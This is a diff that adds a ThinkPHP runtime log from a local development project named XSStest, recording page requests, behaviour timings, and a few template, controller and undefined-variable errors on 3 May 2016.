@@ -1,0 +1,2373 @@
+[ 2016-05-03T11:15:22+08:00 ] ::1 /eclipse/XSStest/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000317s ]
+INFO: [ app_init ] --END-- [ RunTime:0.002069s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.001033s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001141s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000897s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.001003s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.029707s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.029822s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000388s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000431s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.001034s ]
+INFO: [ app_end ] --END-- [ RunTime:0.001115s ]
+
+[ 2016-05-03T11:31:34+08:00 ] ::1 /eclipse/XSStest/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000035s ]
+INFO: [ app_init ] --END-- [ RunTime:0.003914s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.004176s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.004290s ]
+INFO: [ view_parse ] --START--
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.003018s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.003137s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.003674s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.003784s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.004146s ]
+INFO: [ app_end ] --END-- [ RunTime:0.004245s ]
+
+[ 2016-05-03T11:33:01+08:00 ] ::1 /eclipse/XSStest/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000047s ]
+INFO: [ app_init ] --END-- [ RunTime:0.003921s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.003953s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.004077s ]
+INFO: [ view_parse ] --START--
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.003264s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.003381s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.003600s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.003696s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.003936s ]
+INFO: [ app_end ] --END-- [ RunTime:0.004027s ]
+
+[ 2016-05-03T11:33:01+08:00 ] ::1 /eclipse/XSStest/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000433s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000462s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000514s ]
+INFO: [ view_parse ] --START--
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.000160s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.000208s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000158s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000192s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000387s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000420s ]
+
+[ 2016-05-03T11:33:02+08:00 ] ::1 /eclipse/XSStest/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000248s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000342s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000394s ]
+INFO: [ view_parse ] --START--
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.000118s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.000150s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000102s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000124s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000421s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000465s ]
+
+[ 2016-05-03T11:33:02+08:00 ] ::1 /eclipse/XSStest/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000370s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000382s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000427s ]
+INFO: [ view_parse ] --START--
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.000431s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.000507s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000326s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000398s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000438s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000534s ]
+
+[ 2016-05-03T11:33:10+08:00 ] ::1 /eclipse/XSStest/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000325s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000362s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000404s ]
+INFO: [ view_parse ] --START--
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.000131s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.000169s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000102s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000133s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000375s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000407s ]
+
+[ 2016-05-03T11:33:11+08:00 ] ::1 /eclipse/XSStest/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000376s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000364s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000405s ]
+INFO: [ view_parse ] --START--
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.000127s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.000165s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000116s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000144s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000413s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000448s ]
+
+[ 2016-05-03T11:33:11+08:00 ] ::1 /eclipse/XSStest/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000215s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000268s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000298s ]
+INFO: [ view_parse ] --START--
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.000098s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.000125s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000086s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000108s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000277s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000301s ]
+
+[ 2016-05-03T11:33:14+08:00 ] ::1 /eclipse/XSStest/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000211s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000259s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000289s ]
+INFO: [ view_parse ] --START--
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.000097s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.000124s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000086s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000107s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000272s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000295s ]
+
+[ 2016-05-03T11:33:14+08:00 ] ::1 /eclipse/XSStest/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000250s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000304s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000339s ]
+INFO: [ view_parse ] --START--
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.000113s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.000145s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000100s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000123s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000386s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000436s ]
+
+[ 2016-05-03T11:33:21+08:00 ] ::1 /eclipse/XSStest/index.php
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000324s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000341s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000401s ]
+INFO: [ view_parse ] --START--
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.000124s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.000160s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000097s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000126s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000361s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000393s ]
+
+[ 2016-05-03T11:34:50+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/index
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.003899s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.004294s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.004415s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.003298s ]
+INFO: [ app_end ] --END-- [ RunTime:0.003443s ]
+
+[ 2016-05-03T11:35:13+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/index
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000038s ]
+INFO: [ app_init ] --END-- [ RunTime:0.004156s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.004259s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.004371s ]
+ERR: 模板不存在:./Application/Home/View/Back/login.html
+
+[ 2016-05-03T11:36:29+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/index
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000038s ]
+INFO: [ app_init ] --END-- [ RunTime:0.003953s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.003915s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.004016s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000117s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000218s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.025776s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.025943s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.001735s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001814s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.004208s ]
+INFO: [ app_end ] --END-- [ RunTime:0.004304s ]
+
+[ 2016-05-03T11:36:31+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Controller/Back/check
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000209s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000268s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000298s ]
+ERR: 无法加载控制器:Controller
+
+[ 2016-05-03T11:37:16+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Controller/Back/check
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
+INFO: [ app_init ] --END-- [ RunTime:0.004082s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.004051s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.004152s ]
+ERR: 无法加载控制器:Controller
+
+[ 2016-05-03T11:37:19+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Controller/Back/check
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000212s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000278s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000312s ]
+ERR: 无法加载控制器:Controller
+
+[ 2016-05-03T11:37:26+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/index
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000234s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000297s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000328s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000091s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000204s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.018587s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.018674s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.001798s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001873s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.004011s ]
+INFO: [ app_end ] --END-- [ RunTime:0.004102s ]
+
+[ 2016-05-03T11:37:27+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/index
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000206s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000278s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000309s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000023s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000058s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.002838s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.002869s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000119s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000156s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000346s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000374s ]
+
+[ 2016-05-03T11:37:27+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/index
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000302s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000298s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000331s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000021s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000052s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.002737s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.002767s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000092s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000114s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000280s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000306s ]
+
+[ 2016-05-03T11:37:27+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/index
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000340s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000434s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000483s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000047s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000126s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.004922s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.004981s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000212s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000258s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000585s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000638s ]
+
+[ 2016-05-03T11:37:27+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/index
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000011s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000277s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000551s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000614s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000029s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000075s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.004720s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.004767s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000126s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000155s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000374s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000409s ]
+
+[ 2016-05-03T11:37:27+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/index
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000233s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000269s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000298s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000022s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000058s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.002871s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.002901s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000096s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000118s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000284s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000310s ]
+
+[ 2016-05-03T11:37:28+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/index
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000207s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000258s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000288s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000022s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000054s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.002802s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.002835s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000092s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000113s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000281s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000306s ]
+
+[ 2016-05-03T11:37:28+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/index
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000227s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000273s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000303s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000023s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000059s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.002934s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.002963s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000096s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000117s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000283s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000310s ]
+
+[ 2016-05-03T11:37:28+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/index
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000526s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000334s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000374s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000023s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000060s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.003068s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.003110s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.000098s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.000120s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.000534s ]
+INFO: [ app_end ] --END-- [ RunTime:0.000577s ]
+
+[ 2016-05-03T11:37:29+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/check
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000209s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.000260s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.000291s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000034s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000088s ]
+NOTIC: [8] Undefined index: username /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 23 行.
+NOTIC: [8] Undefined index: password /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 23 行.
+NOTIC: [2] require(get.php): failed to open stream: No such file or directory /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+
+[ 2016-05-03T11:38:42+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/check
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000035s ]
+INFO: [ app_init ] --END-- [ RunTime:0.003970s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.003773s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.003905s ]
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000076s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000185s ]
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.018558s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.018678s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.003579s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.003650s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.004136s ]
+INFO: [ app_end ] --END-- [ RunTime:0.004227s ]
+
+[ 2016-05-03T11:47:18+08:00 ] ::1 /eclipse/XSStest/index.php/Home/Back/check
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000068s ]
+INFO: [ app_init ] --END-- [ RunTime:0.004027s ]
+INFO: [ app_begin ] --START--
+INFO: Run Behavior\ReadHtmlCacheBehavior [ RunTime:0.004053s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.004169s ]
+NOTIC: [8] Undefined variable: element /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Home/Controller/BackController.class.php 第 26 行.
+INFO: [ view_parse ] --START--
+INFO: [ template_filter ] --START--
+INFO: Run Behavior\ContentReplaceBehavior [ RunTime:0.000122s ]
+INFO: [ template_filter ] --END-- [ RunTime:0.000224s ]
+NOTIC: [8] Undefined variable: elements /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+NOTIC: [2] Invalid argument supplied for foreach() /Applications/XAMPP/xamppfiles/htdocs/eclipse/XSStest/Application/Runtime/Cache/Home/e2b9af92ee93012b77cb4fc5926aff88.php 第 42 行.
+INFO: Run Behavior\ParseTemplateBehavior [ RunTime:0.016380s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.016454s ]
+INFO: [ view_filter ] --START--
+INFO: Run Behavior\WriteHtmlCacheBehavior [ RunTime:0.001696s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.001771s ]
+INFO: [ app_end ] --START--
+INFO: Run Behavior\ShowPageTraceBehavior [ RunTime:0.004157s ]
+INFO: [ app_end ] --END-- [ RunTime:0.004253s ]
+
